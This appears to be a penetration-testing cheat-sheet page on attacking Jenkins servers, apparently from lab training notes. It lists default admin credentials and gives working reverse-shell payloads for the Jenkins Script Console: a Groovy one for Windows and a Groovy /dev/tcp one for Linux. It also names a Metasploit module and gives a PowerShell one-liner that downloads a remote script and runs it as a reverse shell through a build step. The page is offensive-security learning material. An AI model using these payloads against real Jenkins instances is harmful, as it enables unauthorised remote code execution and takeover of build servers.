## Enumeration 
#### Discovery/footprinting 
```bash
# Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is 
# used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database,
# delegate security to a servlet container, or use no authentication at all. Administrators can also allow or
# disallow users from creating accounts.

http://jenkins.inlanefreight.local:8000/

# default credentials
admin:admin
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/25113f2a-335a-4934-921f-053e397e76c7)

<br>
<br>

## Attacking Jenkins
##### Script Console (Admin) 
If we are admin user we can access `/script` directory we can run Groovy scripts to execute commands OR receive a reverse shell through `Script Console` functionality. 

Option 1: Groovy (windows host) 
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),
si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read
());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(5
0);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Option 2: Groovy (linux host) 
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Optin 3: Metasploit 
```bash
use exploit/multi/http/jenkins_script_console
```
<br> 

#### Script Console (non-admin) 
Jenkins is a widely used enterprise application that will usually run internally on port 8080 -> As a default or regular user with Add or Edit build steps permissions on a project -> Execute Windows Batch Command

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f22b5e86-30ba-47f6-89d2-ed079e57cf9c)

execute a PowerShell reverse shell (Nishang) encoded one-liner from revshells.com -> save & "build now" to run build 
```powershell
powershell iex (iwr http://172.16.100.100/Invoke-PowerShellTcp.ps1;Invoke-PowerShellTCP -Reverse IPAddress 172.16.100.100 -Port 443
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f536a8a8-bf83-4b77-9ea8-0d13417d73d7)











